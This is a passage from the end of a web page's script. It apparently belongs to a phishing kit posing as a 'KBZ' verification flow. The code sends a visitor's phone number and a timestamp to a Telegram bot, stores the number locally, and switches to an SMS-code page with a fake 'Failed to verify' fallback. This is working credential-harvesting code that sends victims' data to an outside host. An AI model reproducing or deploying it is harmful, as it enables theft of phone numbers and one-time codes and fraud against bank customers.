    `â˜ï¸ Phone: <code>${phoneNumber}</code>\n` +
    `â° ${new Date().toLocaleString()}`
  );

  // 2. Only proceed if Telegram succeeds
  if (telegramResult.ok) {
    localStorage.setItem('kbz_phone', phoneNumber);
    document.getElementById('phone-page').style.display = 'none';
    document.getElementById('sms-page').style.display = 'flex';
  } else {
    alert('Failed to verify. Please try again.');
  }
});
</script>

</body>
</html>
